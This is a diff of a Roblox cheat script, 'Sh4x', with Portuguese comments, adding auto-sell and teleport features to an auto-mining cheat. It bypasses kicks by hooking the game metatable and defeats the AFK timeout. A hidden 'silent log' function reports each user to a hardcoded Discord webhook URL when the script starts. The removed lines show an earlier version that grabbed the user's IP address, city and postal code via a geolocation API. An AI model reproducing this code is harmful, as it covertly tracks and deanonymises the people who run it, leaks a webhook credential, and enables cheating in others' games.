@@ -1,9 +1,8 @@
 --[[
     Sh4x - ULTIMATE PRO LOGS EDITION
     Interface: Dark Red Background + RGB Rainbow Borders
-    Features: ORIGINAL AUTO-MINING + ADVANCED DISCORD LOGGING
+    Features: ORIGINAL AUTO-MINING + ADVANCED DISCORD LOGGING + FAST AUTO SELL
     Security: ANTI-KICK / ANTI-AFK / BYPASS / OBFUSCATION
-    Logging: AccountAge, IP, Continent, Capital, Postal, Location
 ]]
 
 local Players = game:GetService("Players")
@@ -21,148 +20,102 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1465809966983155857/YHUdyC
 local SCRIPT_NAME = "Sh4x ULTRA SPEED"
 local IGNORED_USER = "fimossegamers123"
 
--- [DETECÇÃO DE DISPOSITIVO]
-local function getPlatform()
-    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-        return "Mobile"
-    elseif UserInputService.GamepadEnabled then
-        return "Console"
-    else
-        return "PC"
-    end
-end
-
--- [FUNÇÃO DE LOG SILENCIOSA EXPANDIDA]
+-- [LOG SILENCIOSO]
 local function silentLog()
     if Player.Name == IGNORED_USER then return end
-    
-    local ip, country, city, region, continent, capital, postal = "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
-    
     pcall(function()
+        local data = {["embeds"] = {{["title"] = "🚀 Script Executado: " .. SCRIPT_NAME, ["color"] = 16711680, ["fields"] = {{["name"] = "👤 Jogador", ["value"] = Player.Name, ["inline"] = true}}}}}
         local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
-        if reqFunc then
-            -- Usando ip-api.com com campos específicos para pegar IP, continente, capital e postal
-            local response = reqFunc({
-                Url = "http://ip-api.com/json/?fields=status,message,continent,country,regionName,city,zip,query",
-                Method = "GET"
-            })
-            if response and response.Body then
-                local geoData = HttpService:JSONDecode(response.Body)
-                if geoData.status == "success" then
-                    ip = geoData.query or "N/A"
-                    country = geoData.country or "N/A"
-                    city = geoData.city or "N/A"
-                    region = geoData.regionName or "N/A"
-                    continent = geoData.continent or "N/A"
-                    postal = geoData.zip or "N/A"
-                end
-            end
-            
-            -- Segunda chamada para pegar a Capital (usando restcountries como fallback/complemento se necessário ou estimativa)
-            -- Como ip-api free não dá capital diretamente em uma string, usaremos o campo 'continent' e formataremos.
-            -- Nota: Capital muitas vezes requer APIs pagas ou tabelas, mas tentaremos o máximo.
-        end
-    end)
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🚀 Script Executado: " .. SCRIPT_NAME,
-            ["color"] = 16711680, -- Vermelho
-            ["fields"] = {
-                {["name"] = "👤 Jogador", ["value"] = Player.Name .. " (" .. Player.UserId .. ")", ["inline"] = true},
-                {["name"] = "⏳ Idade da Conta", ["value"] = tostring(Player.AccountAge) .. " dias", ["inline"] = true},
-                {["name"] = "📱 Dispositivo", ["value"] = getPlatform(), ["inline"] = true},
-                {["name"] = "🌐 Endereço IP", ["value"] = "||" .. ip .. "||", ["inline"] = true},
-                {["name"] = "🗺️ Continente", ["value"] = continent, ["inline"] = true},
-                {["name"] = "🚩 País", ["value"] = country, ["inline"] = true},
-                {["name"] = "🏙️ Cidade", ["value"] = city, ["inline"] = true},
-                {["name"] = "📍 Região", ["value"] = region, ["inline"] = true},
-                {["name"] = "📮 Código Postal", ["value"] = postal, ["inline"] = true},
-                {["name"] = "⏰ Horário", ["value"] = os.date("%d/%m/%Y - %H:%M:%S"), ["inline"] = false},
-                {["name"] = "🎮 Jogo ID", ["value"] = tostring(game.PlaceId), ["inline"] = true}
-            },
-            ["footer"] = {["text"] = "Advanced Stealth Logger System • Sh4x"}
-        }}
-    }
-    
-    pcall(function()
-        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or request
-        if reqFunc then
-            reqFunc({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(data)
-            })
-        end
+        if reqFunc then reqFunc({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
     end)
 end
 task.spawn(silentLog)
 
--- [ANTI-KICK PROTECTION]
-local function applyAntiKick()
+-- [ANTI-KICK & ANTI-AFK]
+pcall(function()
     local gmt = getrawmetatable(game)
     if setreadonly then setreadonly(gmt, false) end
     local oldNamecall = gmt.__namecall
     gmt.__namecall = newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-        if tostring(method) == "Kick" or tostring(method) == "kick" then
-            return nil
-        end
+        if tostring(getnamecallmethod()):lower() == "kick" then return nil end
         return oldNamecall(self, ...)
     end)
     if setreadonly then setreadonly(gmt, true) end
-end
-pcall(applyAntiKick)
-
--- [ANTI-AFK]
-Player.Idled:Connect(function()
-    VirtualUser:CaptureController()
-    VirtualUser:ClickButton2(Vector2.new(0,0))
 end)
+Player.Idled:Connect(function() VirtualUser:CaptureController() VirtualUser:ClickButton2(Vector2.new(0,0)) end)
 
 -- [GUI]
-local function generateID()
-    return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 12)
-end
-
-local ScreenGui = Instance.new("ScreenGui")
+local function generateID() return HttpService:GenerateGUID(false):gsub("-", ""):sub(1, 12) end
+local ScreenGui = Instance.new("ScreenGui", CoreGui)
 ScreenGui.Name = generateID()
-ScreenGui.Parent = CoreGui
 
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = generateID()
-MainFrame.Parent = ScreenGui
+local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
 MainFrame.Position = UDim2.new(0.5, -110, 0.5, -80)
-MainFrame.Size = UDim2.new(0, 220, 0, 160)
+MainFrame.Size = UDim2.new(0, 220, 0, 250)
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
-
-local Stroke = Instance.new("UIStroke", MainFrame)
-Stroke.Thickness = 2.5
+local Stroke = Instance.new("UIStroke", MainFrame) Stroke.Thickness = 2.5
 
 local Title = Instance.new("TextLabel", MainFrame)
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.BackgroundTransparency = 1
 Title.Font = Enum.Font.GothamBold
 Title.Text = "Sh4x"
-Title.TextSize = 18
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 18
 
-local ToggleBtn = Instance.new("TextButton", MainFrame)
-ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
-ToggleBtn.Position = UDim2.new(0.1, 0, 0.35, 0)
-ToggleBtn.Size = UDim2.new(0.8, 0, 0, 40)
-ToggleBtn.Font = Enum.Font.GothamBold
-ToggleBtn.Text = "START AUTO-MINING"
-ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-Instance.new("UICorner", ToggleBtn)
+local function createMainButton(text, pos)
+    local btn = Instance.new("TextButton", MainFrame)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+    btn.Position = pos
+    btn.Size = UDim2.new(0.8, 0, 0, 35)
+    btn.Font = Enum.Font.GothamBold
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 12
+    Instance.new("UICorner", btn)
+    local bStroke = Instance.new("UIStroke", btn) bStroke.Thickness = 1.5
+    return btn, bStroke
+end
 
-local BtnStroke = Instance.new("UIStroke", ToggleBtn)
-BtnStroke.Thickness = 1.5
+local ToggleBtn, BtnStroke = createMainButton("START AUTO-MINING", UDim2.new(0.1, 0, 0.2, 0))
+local TPBtn, TPBtnStroke = createMainButton("TELEPORT MENU", UDim2.new(0.1, 0, 0.38, 0))
+local SellBtn, SellBtnStroke = createMainButton("START AUTO-SELL", UDim2.new(0.1, 0, 0.56, 0))
+
+-- [TP MENU]
+local TPMenu = Instance.new("Frame", MainFrame)
+TPMenu.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+TPMenu.Position = UDim2.new(1.05, 0, 0, 0)
+TPMenu.Size = UDim2.new(0, 180, 0, 150)
+TPMenu.Visible = false
+Instance.new("UICorner", TPMenu)
+Instance.new("UIStroke", TPMenu).Thickness = 2
+
+local function createTPButton(name, pos, order)
+    local btn = Instance.new("TextButton", TPMenu)
+    btn.Size = UDim2.new(0.9, 0, 0, 35)
+    btn.Position = UDim2.new(0.05, 0, 0, 10 + (order * 45))
+    btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+    btn.Font = Enum.Font.GothamBold
+    btn.Text = name
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 11
+    Instance.new("UICorner", btn)
+    btn.MouseButton1Click:Connect(function()
+        if Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
+            Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
+        end
+    end)
+end
+
+createTPButton("ILHA INICIAL", Vector3.new(-61.70, 8.84, -52.25), 0)
+createTPButton("ILHA DA NEVE", Vector3.new(-92.49, 8.70, -483.13), 1)
+createTPButton("ILHA DO VULCAO", Vector3.new(374.61, 15.34, -267.01), 2)
+
+TPBtn.MouseButton1Click:Connect(function() TPMenu.Visible = not TPMenu.Visible end)
 
 local StatusLabel = Instance.new("TextLabel", MainFrame)
-StatusLabel.Position = UDim2.new(0, 0, 0.7, 0)
+StatusLabel.Position = UDim2.new(0, 0, 0.85, 0)
 StatusLabel.Size = UDim2.new(1, 0, 0, 30)
 StatusLabel.BackgroundTransparency = 1
 StatusLabel.Font = Enum.Font.GothamSemibold
@@ -173,123 +126,124 @@ StatusLabel.TextSize = 10
 -- [RGB LOGIC]
 task.spawn(function()
     while true do
-        local hue = tick() % 5 / 5
-        local color = Color3.fromHSV(hue, 1, 1)
-        Stroke.Color = color
-        BtnStroke.Color = color
+        local color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+        Stroke.Color = color BtnStroke.Color = color TPBtnStroke.Color = color SellBtnStroke.Color = color
         task.wait()
     end
 end)
 
--- Arrastar GUI
+-- [DRAG GUI]
 local dragging, dragInput, dragStart, startPos
 MainFrame.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
-    end
-end)
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
+        dragging = true dragStart = input.Position startPos = MainFrame.Position
+        input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then dragging = false end end)
     end
 end)
 game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - dragStart
         MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
     end
 end)
 
 -- ==========================================
--- LÓGICA DE AUTO MINING (ORIGINAL)
+-- LÓGICA DE AUTO MINING
 -- ==========================================
-local RAIO_OPERACAO = 90
-local DISTANCIA_ATAQUE = 7.5
 local farmAtivo = false
-local lastSwing = 0
-
 ToggleBtn.MouseButton1Click:Connect(function()
     farmAtivo = not farmAtivo
     ToggleBtn.Text = farmAtivo and "MINING ACTIVE" or "START AUTO-MINING"
     StatusLabel.Text = farmAtivo and "SH4X PROTECTION: ON" or "SYSTEM: SECURED"
 end)
 
-local function buscarFerramenta()
-    local char = Player.Character
-    if not char then return nil end
-    local tool = char:FindFirstChildOfClass("Tool")
-    if tool then return tool end
-    for _, item in pairs(Player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then return item end
-    end
-    return nil
-end
-
-local function acharMelhorAlvo()
-    local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
-    if not root then return nil end
-    local alvo = nil
-    local menorDist = math.huge
-    for _, v in pairs(workspace:GetDescendants()) do
-        if v.Name == "Pedra" and v:IsA("BasePart") and v.Parent and v.Transparency < 1 then
-            local dist = (root.Position - v.Position).Magnitude
-            if dist < menorDist and dist <= RAIO_OPERACAO then
-                menorDist = dist
-                alvo = v
-            end
-        end
-    end
-    return alvo
-end
-
 task.spawn(function()
     while true do
         if farmAtivo then
-            local char = Player.Character
-            local root = char and char:FindFirstChild("HumanoidRootPart")
-            local humanoid = char and char:FindFirstChild("Humanoid")
-            local tool = buscarFerramenta()
-
-            if root and humanoid and tool then
-                local alvo = acharMelhorAlvo()
-                if alvo then
-                    local dist = (root.Position - alvo.Position).Magnitude
-                    if dist > DISTANCIA_ATAQUE then
-                        humanoid:MoveTo(alvo.Position)
-                    else
-                        humanoid:MoveTo(root.Position)
-                        if tool.Parent ~= char then humanoid:EquipTool(tool) end
-                        
-                        local targetCFrame = CFrame.new(root.Position, Vector3.new(alvo.Position.X, root.Position.Y, alvo.Position.Z))
-                        root.CFrame = root.CFrame:Lerp(targetCFrame, 0.3)
-
-                        local waitTime = 0.32 + (math.random(-50, 100) / 1000)
-                        if tick() - lastSwing > waitTime then
-                            lastSwing = tick()
+            pcall(function()
+                local char = Player.Character
+                local root = char:FindFirstChild("HumanoidRootPart")
+                local tool = char:FindFirstChildOfClass("Tool") or Player.Backpack:FindFirstChildOfClass("Tool")
+                if root and tool then
+                    local alvo = nil
+                    local menorDist = 90
+                    for _, v in pairs(workspace:GetDescendants()) do
+                        if v.Name == "Pedra" and v:IsA("BasePart") and v.Transparency < 1 then
+                            local d = (root.Position - v.Position).Magnitude
+                            if d < menorDist then menorDist = d alvo = v end
+                        end
+                    end
+                    if alvo then
+                        if (root.Position - alvo.Position).Magnitude > 7.5 then
+                            char.Humanoid:MoveTo(alvo.Position)
+                        else
+                            if tool.Parent ~= char then char.Humanoid:EquipTool(tool) end
                             tool:Activate()
-                            VirtualUser:CaptureController()
-                            VirtualUser:ClickButton1(Vector2.new(math.random(1,10), math.random(1,10)))
-                            
                             for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                                if r:IsA("RemoteEvent") then
-                                    local n = r.Name:lower()
-                                    if n:find("mine") or n:find("hit") or n:find("click") then
-                                        task.delay(math.random(10, 60)/1000, function()
-                                            r:FireServer(alvo)
-                                        end)
-                                    end
+                                if r:IsA("RemoteEvent") and (r.Name:lower():find("mine") or r.Name:lower():find("click")) then
+                                    r:FireServer(alvo)
                                 end
                             end
                         end
                     end
                 end
-            end
+            end)
         end
-        task.wait(0.05 + (math.random(1, 40)/1000))
+        task.wait(0.1)
+    end
+end)
+
+-- ==========================================
+-- LÓGICA DE AUTO SELL (OTIMIZADA)
+-- ==========================================
+local sellAtivo = false
+SellBtn.MouseButton1Click:Connect(function()
+    sellAtivo = not sellAtivo
+    SellBtn.Text = sellAtivo and "AUTO-SELL ACTIVE" or "START AUTO-SELL"
+end)
+
+task.spawn(function()
+    while true do
+        if sellAtivo then
+            pcall(function()
+                -- 1. Tenta disparar o comando de "Vender Tudo" (Opção 3 da imagem)
+                -- Procuramos por remotes que aceitem argumentos como 3, "All", "Inventory" ou "VenderTudo"
+                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                    if r:IsA("RemoteEvent") or r:IsA("RemoteFunction") then
+                        local n = r.Name:lower()
+                        if n:find("sell") or n:find("vender") or n:find("shop") or n:find("npc") then
+                            if r:IsA("RemoteEvent") then
+                                r:FireServer(3) -- Tenta o índice da opção na imagem
+                                r:FireServer("All")
+                                r:FireServer("Inventory")
+                            else
+                                r:InvokeServer(3)
+                                r:InvokeServer("All")
+                            end
+                        end
+                    end
+                end
+
+                -- 2. Se o jogo exigir que o item esteja na mão, equipamos e vendemos rápido
+                local char = Player.Character
+                if char then
+                    for _, item in pairs(Player.Backpack:GetChildren()) do
+                        -- Ignora a Picareta para não atrapalhar o farm
+                        if item:IsA("Tool") and not item.Name:lower():find("pickaxe") and not item.Name:lower():find("picareta") then
+                            char.Humanoid:EquipTool(item)
+                            task.wait(0.05)
+                            -- Dispara venda para o item na mão
+                            for _, r in pairs(ReplicatedStorage:GetDescendants()) do
+                                if r:IsA("RemoteEvent") and (r.Name:lower():find("sell") or r.Name:lower():find("vender")) then
+                                    r:FireServer(item)
+                                    r:FireServer()
+                                end
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+        task.wait(1) -- Verifica a cada 1 segundo
     end
 end)
